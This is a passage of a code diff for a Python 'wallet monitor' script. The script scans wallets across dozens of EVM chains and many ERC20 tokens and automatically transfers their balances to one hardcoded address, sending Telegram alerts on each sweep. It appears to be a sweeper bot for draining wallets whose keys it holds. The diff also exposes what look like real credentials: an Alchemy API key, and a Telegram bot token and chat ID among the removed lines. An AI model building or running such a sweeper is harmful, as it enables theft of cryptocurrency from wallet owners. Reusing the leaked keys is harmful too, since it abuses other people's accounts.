@@ -18,6 +18,10 @@ from datetime import datetime
 from typing import Dict, List, Optional, Any
 from dataclasses import dataclass
 import concurrent.futures
+import logging
+from urllib3.util.retry import Retry
+from requests.adapters import HTTPAdapter
+import requests.sessions
 
 # 自动安装依赖
 def auto_install_dependencies():
@@ -28,7 +32,8 @@ def auto_install_dependencies():
         'colorama': 'colorama',
         'aiohttp': 'aiohttp',
         'cryptography': 'cryptography',
-        'requests': 'requests'
+        'requests': 'requests',
+        'urllib3': 'urllib3'
     }
     
     missing_packages = []
@@ -65,7 +70,7 @@ if not auto_install_dependencies():
 try:
     from web3 import Web3
     from eth_account import Account
-    from colorama import Fore, Style, Back, init
+    from colorama import Fore, Style, init
     import aiohttp
     import cryptography
     import requests
@@ -78,453 +83,9 @@ except ImportError as e:
     print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
     sys.exit(1)
 
-# 配置 - 无限API密钥轮询系统
-ALCHEMY_API_KEYS = [
-    "MYr2ZG1P7bxc4F1qVTLIj",   # 当前有效API密钥
-    # 🔑 在此处添加更多API密钥:
-    # "YOUR_NEW_API_KEY_1",
-    # "YOUR_NEW_API_KEY_2", 
-    # "YOUR_NEW_API_KEY_3",
-    # ... 支持无限个API密钥
-]
-CURRENT_API_KEY_INDEX = 0
-API_REQUEST_COUNT = 0  # 请求计数器，用于轮询
-REQUESTS_PER_API = 5   # 每个API密钥使用几次后切换
-
-TARGET_ADDRESS = Web3.to_checksum_address("0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1")
-
-# Telegram通知配置
-TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
-TELEGRAM_CHAT_ID = "5963704377"
-TELEGRAM_NOTIFICATIONS_ENABLED = True  # 是否启用TG通知
-
-# 🗂️ 数据缓存和日志配置
-MAX_LOG_SIZE_MB = 500  # 最大日志文件大小(MB)
-TRANSACTION_HISTORY_CACHE_FILE = "transaction_history_cache.json"  # 交易记录缓存
-WALLET_SCAN_CACHE_FILE = "wallet_scan_cache.json"  # 钱包扫描缓存
-RPC_CONNECTION_CACHE_FILE = "rpc_connection_cache.json"  # RPC连接缓存
-
-def get_current_api_key():
-    """获取当前API密钥"""
-    if not ALCHEMY_API_KEYS:
-        raise ValueError("❌ 没有可用的API密钥，请添加至少一个API密钥")
-    return ALCHEMY_API_KEYS[CURRENT_API_KEY_INDEX]
-
-def rotate_api_key():
-    """轮询到下一个API密钥（每N次请求自动轮换）"""
-    global CURRENT_API_KEY_INDEX, API_REQUEST_COUNT
-    
-    if len(ALCHEMY_API_KEYS) <= 1:
-        return get_current_api_key()
-    
-    API_REQUEST_COUNT += 1
-    
-    # 每REQUESTS_PER_API次请求后切换API密钥
-    if API_REQUEST_COUNT >= REQUESTS_PER_API:
-        old_index = CURRENT_API_KEY_INDEX
-        CURRENT_API_KEY_INDEX = (CURRENT_API_KEY_INDEX + 1) % len(ALCHEMY_API_KEYS)
-        API_REQUEST_COUNT = 0
-        
-        print(f"{Fore.CYAN}🔄 轮询切换 API#{old_index + 1} → API#{CURRENT_API_KEY_INDEX + 1} ({get_current_api_key()[:8]}...){Style.RESET_ALL}")
-    
-    return get_current_api_key()
-
-def force_switch_api_key():
-    """强制切换到下一个API密钥（故障转移时使用）"""
-    global CURRENT_API_KEY_INDEX, API_REQUEST_COUNT
-    
-    if len(ALCHEMY_API_KEYS) <= 1:
-        return get_current_api_key()
-    
-    old_index = CURRENT_API_KEY_INDEX
-    CURRENT_API_KEY_INDEX = (CURRENT_API_KEY_INDEX + 1) % len(ALCHEMY_API_KEYS)
-    API_REQUEST_COUNT = 0
-    
-    print(f"{Fore.YELLOW}🚨 故障转移 API#{old_index + 1} → API#{CURRENT_API_KEY_INDEX + 1} ({get_current_api_key()[:8]}...){Style.RESET_ALL}")
-    return get_current_api_key()
-
-def add_api_key(new_api_key: str):
-    """动态添加新的API密钥"""
-    if new_api_key and new_api_key not in ALCHEMY_API_KEYS:
-        ALCHEMY_API_KEYS.append(new_api_key)
-        print(f"{Fore.GREEN}✅ 新增API密钥: {new_api_key[:8]}... (总计: {len(ALCHEMY_API_KEYS)} 个){Style.RESET_ALL}")
-        return True
-    return False
-
-# 智能速率控制系统
-API_RATE_LIMITS = {
-    'cu_per_second': 500,           # 每秒计算单位限制
-    'monthly_cu_limit': 30000000,   # 每月3000万CU限制
-    'cu_per_request': 20,           # 估算每个请求消耗的CU
-}
-
-# 动态计算的速率控制参数
-MONTHLY_USAGE_TRACKER = {
-    'current_month': datetime.now().month,
-    'current_year': datetime.now().year,
-    'used_cu': 0,
-    'daily_target': 0,
-    'optimal_interval': 5.0,
-    'last_reset': datetime.now().isoformat()
-}
-
-def calculate_optimal_scanning_params():
-    """根据API限制和剩余时间计算最优扫描参数"""
-    import calendar
-    
-    now = datetime.now()
-    current_month = now.month
-    current_year = now.year
-    current_day = now.day
-    
-    # 获取当月总天数
-    days_in_month = calendar.monthrange(current_year, current_month)[1]
-    remaining_days = days_in_month - current_day + 1
-    
-    # 重置月度使用情况（如果是新月份）
-    if (MONTHLY_USAGE_TRACKER['current_month'] != current_month or 
-        MONTHLY_USAGE_TRACKER['current_year'] != current_year):
-        MONTHLY_USAGE_TRACKER.update({
-            'current_month': current_month,
-            'current_year': current_year,
-            'used_cu': 0,
-            'last_reset': now.isoformat()
-        })
-    
-    # 计算参数
-    total_api_keys = len(ALCHEMY_API_KEYS)
-    total_monthly_limit = API_RATE_LIMITS['monthly_cu_limit'] * total_api_keys  # 多API密钥扩容
-    remaining_cu = total_monthly_limit - MONTHLY_USAGE_TRACKER['used_cu']
-    
-    # 每日目标CU使用量
-    daily_target_cu = remaining_cu / remaining_days if remaining_days > 0 else remaining_cu
-    
-    # 每秒可用CU (考虑多API密钥)
-    cu_per_second = API_RATE_LIMITS['cu_per_second'] * total_api_keys
-    
-    # 计算最优扫描间隔
-    cu_per_request = API_RATE_LIMITS['cu_per_request']
-    max_requests_per_second = cu_per_second / cu_per_request
-    optimal_interval = 1.0 / max_requests_per_second if max_requests_per_second > 0 else 5.0
-    
-    # 确保不超过每日目标
-    max_requests_per_day = daily_target_cu / cu_per_request
-    max_requests_per_second_daily = max_requests_per_day / (24 * 3600)
-    
-    if max_requests_per_second_daily < max_requests_per_second:
-        optimal_interval = 1.0 / max_requests_per_second_daily if max_requests_per_second_daily > 0 else 30.0
-    
-    # 更新全局参数
-    MONTHLY_USAGE_TRACKER.update({
-        'daily_target': daily_target_cu,
-        'optimal_interval': max(optimal_interval, 0.1)  # 最小间隔0.1秒
-    })
-    
-    return {
-        'total_api_keys': total_api_keys,
-        'remaining_days': remaining_days,
-        'remaining_cu': remaining_cu,
-        'daily_target_cu': daily_target_cu,
-        'optimal_interval': MONTHLY_USAGE_TRACKER['optimal_interval'],
-        'max_requests_per_second': max_requests_per_second,
-        'total_monthly_limit': total_monthly_limit,
-        'current_usage_percent': (MONTHLY_USAGE_TRACKER['used_cu'] / total_monthly_limit * 100) if total_monthly_limit > 0 else 0
-    }
-
-def update_cu_usage(cu_used: int):
-    """更新CU使用量"""
-    MONTHLY_USAGE_TRACKER['used_cu'] += cu_used
-
-def enhanced_safe_input(prompt: str, default: str = "") -> str:
-    """最简化的输入函数"""
-    try:
-        result = input(prompt)
-        return result.strip() if result.strip() else default
-    except:
-        return default
-
-async def send_telegram_notification(message: str, silent: bool = False) -> bool:
-    """发送Telegram通知"""
-    if not TELEGRAM_NOTIFICATIONS_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-        return False
-    
-    try:
-        import aiohttp
-        
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        
-        # 构建消息数据
-        data = {
-            'chat_id': TELEGRAM_CHAT_ID,
-            'text': message,
-            'parse_mode': 'HTML',
-            'disable_notification': silent
-        }
-        
-        async with aiohttp.ClientSession() as session:
-            async with session.post(url, data=data, timeout=10) as response:
-                if response.status == 200:
-                    print(f"{Fore.GREEN}📱 TG通知发送成功{Style.RESET_ALL}")
-                    return True
-                else:
-                    print(f"{Fore.YELLOW}📱 TG通知发送失败: HTTP {response.status}{Style.RESET_ALL}")
-                    return False
-                    
-    except Exception as e:
-        print(f"{Fore.YELLOW}📱 TG通知发送异常: {str(e)[:50]}...{Style.RESET_ALL}")
-        return False
-
-def format_transfer_notification(wallet_addr: str, network_name: str, amount: float, currency: str, tx_hash: str) -> str:
-    """格式化转账通知消息"""
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    # 创建格式化的HTML消息
-    message = f"""🎉 <b>自动转账成功！</b>
-
-💰 <b>转账金额:</b> {amount:.8f} {currency}
-🌐 <b>网络:</b> {network_name}
-📍 <b>来源钱包:</b> <code>{wallet_addr[:10]}...{wallet_addr[-8:]}</code>
-🎯 <b>目标地址:</b> <code>{TARGET_ADDRESS[:10]}...{TARGET_ADDRESS[-8:]}</code>
-📋 <b>交易哈希:</b> <code>{tx_hash[:16]}...{tx_hash[-16:]}</code>
-⏰ <b>时间:</b> {timestamp}
-
-🔗 完整交易: <code>{tx_hash}</code>"""
-    
-    return message
-
-# 转账统计数据结构
-TRANSFER_STATS = {
-    'total_transfers': 0,
-    'total_amount_eth': 0.0,
-    'networks_used': {},
-    'successful_notifications': 0,
-    'failed_notifications': 0,
-    'last_transfer_time': None,
-    'daily_stats': {},
-    'erc20_transfers': 0,
-    'insufficient_gas_events': 0
-}
-
-# ERC20代币配置
-ERC20_SCAN_ENABLED = True  # 是否启用ERC20扫描
-MIN_TOKEN_VALUE_USD = 0.1  # 最小代币价值（美元）
-
-# 常见的有价值ERC20代币地址 (正确的合约地址)
-VALUABLE_ERC20_TOKENS = {
-    'ethereum': {
-        '0xdAC17F958D2ee523a2206206994597C13D831ec7': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
-        '0xA0b86a33E6441E98F076EE6E5ede8Bd7C81a5E22': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
-        '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
-        '0x514910771AF9Ca656af840dff83E8264EcF986CA': {'symbol': 'LINK', 'decimals': 18, 'name': 'Chainlink'},
-        '0x6B175474E89094C44Da98b954EedeAC495271d0F': {'symbol': 'DAI', 'decimals': 18, 'name': 'Dai Stablecoin'},
-    },
-    'polygon': {
-        '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
-        '0xc2132D05D31c914a87C6611C10748AEb04B58e8F': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
-        '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270': {'symbol': 'WMATIC', 'decimals': 18, 'name': 'Wrapped Matic'},
-        '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063': {'symbol': 'DAI', 'decimals': 18, 'name': 'Dai Stablecoin'},
-    },
-    'arbitrum': {
-        '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
-        '0xaf88d065e77c8cC2239327C5EDb3A432268e5831': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
-        '0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
-    },
-    'optimism': {
-        '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58': {'symbol': 'USDT', 'decimals': 6, 'name': 'Tether USD'},
-        '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
-        '0x6fd9d7AD17242c41f7131d257212c54A0e816691': {'symbol': 'UNI', 'decimals': 18, 'name': 'Uniswap'},
-    },
-    'base': {
-        '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913': {'symbol': 'USDC', 'decimals': 6, 'name': 'USD Coin'},
-        '0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed': {'symbol': 'DEGEN', 'decimals': 18, 'name': 'Degen'},
-    }
-}
-
-# ERC20 ABI (简化版，只包含必要函数)
-ERC20_ABI = [
-    {
-        "constant": True,
-        "inputs": [{"name": "_owner", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "balance", "type": "uint256"}],
-        "type": "function"
-    },
-    {
-        "constant": True,
-        "inputs": [],
-        "name": "decimals",
-        "outputs": [{"name": "", "type": "uint8"}],
-        "type": "function"
-    },
-    {
-        "constant": True,
-        "inputs": [],
-        "name": "symbol",
-        "outputs": [{"name": "", "type": "string"}],
-        "type": "function"
-    },
-    {
-        "constant": False,
-        "inputs": [
-            {"name": "_to", "type": "address"},
-            {"name": "_value", "type": "uint256"}
-        ],
-        "name": "transfer",
-        "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-    }
-]
-
-def update_transfer_stats(network_name: str, amount: float, currency: str, notification_success: bool = False):
-    """更新转账统计"""
-    today = datetime.now().strftime("%Y-%m-%d")
-    
-    # 更新全局统计
-    TRANSFER_STATS['total_transfers'] += 1
-    
-    # 如果是ETH或等价物，加入总金额统计
-    if currency in ['ETH', 'WETH']:
-        TRANSFER_STATS['total_amount_eth'] += amount
-    
-    # 网络统计
-    if network_name not in TRANSFER_STATS['networks_used']:
-        TRANSFER_STATS['networks_used'][network_name] = {'count': 0, 'amount': 0.0}
-    TRANSFER_STATS['networks_used'][network_name]['count'] += 1
-    TRANSFER_STATS['networks_used'][network_name]['amount'] += amount
-    
-    # 通知统计
-    if notification_success:
-        TRANSFER_STATS['successful_notifications'] += 1
-    else:
-        TRANSFER_STATS['failed_notifications'] += 1
-    
-    # 更新最后转账时间
-    TRANSFER_STATS['last_transfer_time'] = datetime.now().isoformat()
-    
-    # 每日统计
-    if today not in TRANSFER_STATS['daily_stats']:
-        TRANSFER_STATS['daily_stats'][today] = {'transfers': 0, 'amount': 0.0}
-    TRANSFER_STATS['daily_stats'][today]['transfers'] += 1
-    TRANSFER_STATS['daily_stats'][today]['amount'] += amount
-    
-    # 保存统计数据
-    save_transfer_stats()
-
-def save_transfer_stats():
-    """保存转账统计到文件"""
-    try:
-        # 检查并轮转日志文件
-        check_and_rotate_log_file('transfer_stats.json')
-        
-        with open('transfer_stats.json', 'w', encoding='utf-8') as f:
-            json.dump(TRANSFER_STATS, f, ensure_ascii=False, indent=2)
-    except:
-        pass
-
-def load_transfer_stats():
-    """加载转账统计"""
-    global TRANSFER_STATS
-    try:
-        if os.path.exists('transfer_stats.json'):
-            with open('transfer_stats.json', 'r', encoding='utf-8') as f:
-                loaded_stats = json.load(f)
-                TRANSFER_STATS.update(loaded_stats)
-    except:
-        pass
-
-def get_transfer_stats_summary() -> str:
-    """获取转账统计摘要"""
-    total = TRANSFER_STATS['total_transfers']
-    total_eth = TRANSFER_STATS['total_amount_eth']
-    networks = len(TRANSFER_STATS['networks_used'])
-    success_rate = 0
-    
-    if total > 0:
-        success_rate = (TRANSFER_STATS['successful_notifications'] / total) * 100
-    
-    today = datetime.now().strftime("%Y-%m-%d")
-    today_transfers = TRANSFER_STATS['daily_stats'].get(today, {}).get('transfers', 0)
-    
-    return f"📊 总转账: {total} 笔 | 📈 今日: {today_transfers} 笔 | 💰 总计: {total_eth:.6f} ETH | 🌐 网络: {networks} 个 | 📱 通知成功率: {success_rate:.1f}%"
-
-# 🗂️ 日志和缓存管理系统
-def check_and_rotate_log_file(log_file_path: str):
-    """检查日志文件大小，超过限制时自动轮转"""
-    try:
-        if os.path.exists(log_file_path):
-            file_size_mb = os.path.getsize(log_file_path) / (1024 * 1024)
-            
-            if file_size_mb > MAX_LOG_SIZE_MB:
-                # 备份旧日志
-                backup_path = f"{log_file_path}.backup"
-                if os.path.exists(backup_path):
-                    os.remove(backup_path)
-                os.rename(log_file_path, backup_path)
-                
-                print(f"{Fore.YELLOW}📄 日志文件已轮转: {log_file_path} ({file_size_mb:.1f}MB){Style.RESET_ALL}")
-                return True
-        return False
-    except Exception as e:
-        print(f"{Fore.RED}❌ 日志轮转失败: {e}{Style.RESET_ALL}")
-        return False
-
-def load_transaction_history_cache() -> Dict[str, Dict[str, int]]:
-    """加载交易记录缓存"""
-    try:
-        check_and_rotate_log_file(TRANSACTION_HISTORY_CACHE_FILE)
-        
-        if os.path.exists(TRANSACTION_HISTORY_CACHE_FILE):
-            with open(TRANSACTION_HISTORY_CACHE_FILE, 'r', encoding='utf-8') as f:
-                cache = json.load(f)
-                print(f"{Fore.GREEN}✅ 加载交易记录缓存: {len(cache)} 个钱包{Style.RESET_ALL}")
-                return cache
-    except Exception as e:
-        print(f"{Fore.YELLOW}⚠️ 交易记录缓存加载失败: {e}{Style.RESET_ALL}")
-    
-    return {}
-
-def save_transaction_history_cache(cache: Dict[str, Dict[str, int]]):
-    """保存交易记录缓存"""
-    try:
-        with open(TRANSACTION_HISTORY_CACHE_FILE, 'w', encoding='utf-8') as f:
-            json.dump(cache, f, indent=2, ensure_ascii=False)
-        print(f"{Fore.GREEN}💾 交易记录缓存已保存: {len(cache)} 个钱包{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"{Fore.RED}❌ 交易记录缓存保存失败: {e}{Style.RESET_ALL}")
-
-def load_rpc_connection_cache() -> Dict[str, bool]:
-    """加载RPC连接缓存"""
-    try:
-        if os.path.exists(RPC_CONNECTION_CACHE_FILE):
-            with open(RPC_CONNECTION_CACHE_FILE, 'r', encoding='utf-8') as f:
-                cache = json.load(f)
-                print(f"{Fore.GREEN}✅ 加载RPC连接缓存: {sum(cache.values())}/{len(cache)} 个网络可用{Style.RESET_ALL}")
-                return cache
-    except Exception as e:
-        print(f"{Fore.YELLOW}⚠️ RPC连接缓存加载失败: {e}{Style.RESET_ALL}")
-    
-    return {}
-
-def save_rpc_connection_cache(cache: Dict[str, bool]):
-    """保存RPC连接缓存"""
-    try:
-        with open(RPC_CONNECTION_CACHE_FILE, 'w', encoding='utf-8') as f:
-            json.dump(cache, f, indent=2, ensure_ascii=False)
-        print(f"{Fore.GREEN}💾 RPC连接缓存已保存: {sum(cache.values())}/{len(cache)} 个网络{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"{Fore.RED}❌ RPC连接缓存保存失败: {e}{Style.RESET_ALL}")
-
-def get_api_keys_status():
-    """获取API密钥状态信息"""
-    rate_info = calculate_optimal_scanning_params()
-    return {
-        'total_keys': len(ALCHEMY_API_KEYS),
-        'current_index': CURRENT_API_KEY_INDEX,
-        'current_key': get_current_api_key()[:12] + "..." if ALCHEMY_API_KEYS else "无",
-        'request_count': API_REQUEST_COUNT,
-        'requests_per_api': REQUESTS_PER_API,
-        'rate_info': rate_info
-    }
+# 配置
+ALCHEMY_API_KEY = "MYr2ZG1P7bxc4F1qVTLIj"
+TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"
 
 # 数据文件
 WALLETS_FILE = "wallets.json"
@@ -532,526 +93,447 @@ MONITORING_LOG_FILE = "monitoring_log.json"
 CONFIG_FILE = "config.json"
 NETWORK_STATUS_FILE = "network_status.json"
 
-def build_network_config(use_rotation=False):
-    """动态构建网络配置，支持API密钥轮询"""
-    api_key = rotate_api_key() if use_rotation else get_current_api_key()
-    return {
-        # ============= Layer 1 主网 =============
-        'ethereum': {
-            'name': 'Ethereum 主网',
-            'chain_id': 1,
-            'currency': 'ETH',
-            'rpc_url': f'https://eth-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 1
-        },
-        'polygon': {
-            'name': 'Polygon PoS',
-            'chain_id': 137,
-            'currency': 'MATIC',
-            'rpc_url': f'https://polygon-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 2
-        },
-        'astar': {
-            'name': 'Astar',
-            'chain_id': 592,
-            'currency': 'ASTR',
-            'rpc_url': f'https://astar-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 3
-        },
-        'celo': {
-            'name': 'Celo',
-            'chain_id': 42220,
-            'currency': 'CELO',
-            'rpc_url': f'https://celo-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 4
-        },
-        'bsc': {
-            'name': 'Binance Smart Chain',
-            'chain_id': 56,
-            'currency': 'BNB',
-            'rpc_url': f'https://bnb-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 5
-        },
-        'metis': {
-            'name': 'Metis',
-            'chain_id': 1088,
-            'currency': 'METIS',
-            'rpc_url': f'https://metis-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 6
-        },
-        'avalanche': {
-            'name': 'Avalanche C-Chain',
-            'chain_id': 43114,
-            'currency': 'AVAX',
-            'rpc_url': f'https://avax-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 7
-        },
-        'gnosis': {
-            'name': 'Gnosis',
-            'chain_id': 100,
-            'currency': 'xDAI',
-            'rpc_url': f'https://gnosis-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 8
-        },
-        'rootstock': {
-            'name': 'Rootstock',
-            'chain_id': 30,
-            'currency': 'RBTC',
-            'rpc_url': f'https://rootstock-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 9
-        },
-        
-        # ============= Layer 2 主网 =============
-        'optimism': {
-            'name': 'Optimism (OP Mainnet)',
-            'chain_id': 10,
-            'currency': 'ETH',
-            'rpc_url': f'https://opt-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 10
-        },
-        'arbitrum': {
-            'name': 'Arbitrum',
-            'chain_id': 42161,
-            'currency': 'ETH',
-            'rpc_url': f'https://arb-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 11
-        },
-        'arbitrum_nova': {
-            'name': 'Arbitrum Nova',
-            'chain_id': 42170,
-            'currency': 'ETH',
-            'rpc_url': f'https://arbnova-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 12
-        },
-        'polygon_zkevm': {
-            'name': 'Polygon zkEVM',
-            'chain_id': 1101,
-            'currency': 'ETH',
-            'rpc_url': f'https://polygonzkevm-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 13
-        },
-        'base': {
-            'name': 'Base',
-            'chain_id': 8453,
-            'currency': 'ETH',
-            'rpc_url': f'https://base-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 14
-        },
-        'zksync': {
-            'name': 'zkSync',
-            'chain_id': 324,
-            'currency': 'ETH',
-            'rpc_url': f'https://zksync-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 15
-        },
-        'linea': {
-            'name': 'Linea',
-            'chain_id': 59144,
-            'currency': 'ETH',
-            'rpc_url': f'https://linea-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 16
-        },
-        'scroll': {
-            'name': 'Scroll',
-            'chain_id': 534352,
-            'currency': 'ETH',
-            'rpc_url': f'https://scroll-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 17
-        },
-        'mantle': {
-            'name': 'Mantle',
-            'chain_id': 5000,
-            'currency': 'MNT',
-            'rpc_url': f'https://mantle-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 18
-        },
-        'opbnb': {
-            'name': 'opBNB',
-            'chain_id': 204,
-            'currency': 'BNB',
-            'rpc_url': f'https://opbnb-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 19
-        },
-        
-        # 新兴L2链条 (使用已知链ID，未知的暂时使用占位符)
-        'unichain': {
-            'name': 'Unichain',
-            'chain_id': 1301,  # 使用临时链ID，待官方确认
-            'currency': 'ETH',
-            'rpc_url': f'https://unichain-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 20
-        },
-        'berachain': {
-            'name': 'Berachain',
-            'chain_id': 80085,  # 使用临时链ID，待官方确认
-            'currency': 'BERA',
-            'rpc_url': f'https://berachain-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 21
-        },
-        'soneium': {
-            'name': 'Soneium',
-            'chain_id': 1946,  # 使用临时链ID，待官方确认
-            'currency': 'ETH',
-            'rpc_url': f'https://soneium-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 22
-        },
-        'apechain': {
-            'name': 'ApeChain',
-            'chain_id': 33139,  # 使用临时链ID，待官方确认
-            'currency': 'APE',
-            'rpc_url': f'https://apechain-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 23
-        },
-        'hyperevm': {
-            'name': 'HyperEVM',
-            'chain_id': 998,  # 使用临时链ID，待官方确认
-            'currency': 'ETH',
-            'rpc_url': f'https://hyperevm-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 24
-        },
-        
-        # ============= 新增EVM兼容链条 =============
-        'blast': {
-            'name': 'Blast',
-            'chain_id': 81457,
-            'currency': 'ETH',
-            'rpc_url': f'https://blast-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 25
-        },
-        'sonic': {
-            'name': 'Sonic',
-            'chain_id': 146,
-            'currency': 'S',
-            'rpc_url': f'https://sonic-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 26
-        },
-        'abstract': {
-            'name': 'Abstract',
-            'chain_id': 11124,
-            'currency': 'ETH',
-            'rpc_url': f'https://abstract-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 27
-        },
-        'lumia': {
-            'name': 'Lumia',
-            'chain_id': 994873017,
-            'currency': 'LUMIA',
-            'rpc_url': f'https://lumia-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 28
-        },
-        'ink': {
-            'name': 'Ink',
-            'chain_id': 57073,
-            'currency': 'ETH',
-            'rpc_url': f'https://ink-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 29
-        },
-        'story': {
-            'name': 'Story',
-            'chain_id': 1513,
-            'currency': 'IP',
-            'rpc_url': f'https://story-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 30
-        },
-        'anime': {
-            'name': 'Anime',
-            'chain_id': 11501,
-            'currency': 'ANIME',
-            'rpc_url': f'https://anime-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 31
-        },
-        'botanix': {
-            'name': 'Botanix',
-            'chain_id': 3636,
-            'currency': 'BTC',
-            'rpc_url': f'https://botanix-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 32
-        },
-        'crossfi': {
-            'name': 'CrossFi',
-            'chain_id': 4157,
-            'currency': 'XFI',
-            'rpc_url': f'https://crossfi-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 33
-        },
-        'shape': {
-            'name': 'Shape',
-            'chain_id': 360,
-            'currency': 'ETH',
-            'rpc_url': f'https://shape-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 34
-        },
-        'geist': {
-            'name': 'Geist',
-            'chain_id': 63157,
-            'currency': 'GEIST',
-            'rpc_url': f'https://geist-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 35
-        },
-        'superseed': {
-            'name': 'Superseed',
-            'chain_id': 5330,
-            'currency': 'SEED',
-            'rpc_url': f'https://superseed-mainnet.g.alchemy.com/v2/{api_key}',
-            'type': 'mainnet',
-            'priority': 36
-        },
-        
-        # ============= EVM兼容测试网 =============
-        'ethereum_sepolia': {
-            'name': 'Ethereum Sepolia',
-            'chain_id': 11155111,
-            'currency': 'ETH',
-            'rpc_url': f'https://eth-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 25
-        },
-        'ethereum_goerli': {
-            'name': 'Ethereum Goerli',
-            'chain_id': 5,
-            'currency': 'ETH',
-            'rpc_url': f'https://eth-goerli.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 26
-        },
-        'polygon_mumbai': {
-            'name': 'Polygon Mumbai',
-            'chain_id': 80001,
-            'currency': 'MATIC',
-            'rpc_url': f'https://polygon-mumbai.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 27
-        },
-        'polygon_amoy': {
-            'name': 'Polygon Amoy',
-            'chain_id': 80002,
-            'currency': 'MATIC',
-            'rpc_url': f'https://polygon-amoy.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 28
-        },
-        'optimism_sepolia': {
-            'name': 'Optimism Sepolia',
-            'chain_id': 11155420,
-            'currency': 'ETH',
-            'rpc_url': f'https://opt-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 29
-        },
-        'arbitrum_sepolia': {
-            'name': 'Arbitrum Sepolia',
-            'chain_id': 421614,
-            'currency': 'ETH',
-            'rpc_url': f'https://arb-sepolia.g.alchemy.com/v2/{api_key}',
-            'type': 'testnet',
-            'priority': 30
-        },
-        'polygon_zkevm_cardona': {
-            'name': 'Polygon zkEVM Cardona',
-            'chain_id': 2442,
-            'currency': 'ETH',
-            'rpc_url': f'https://polygonzkevm-cardona.g.alchemy.com/v2/{api_key}',
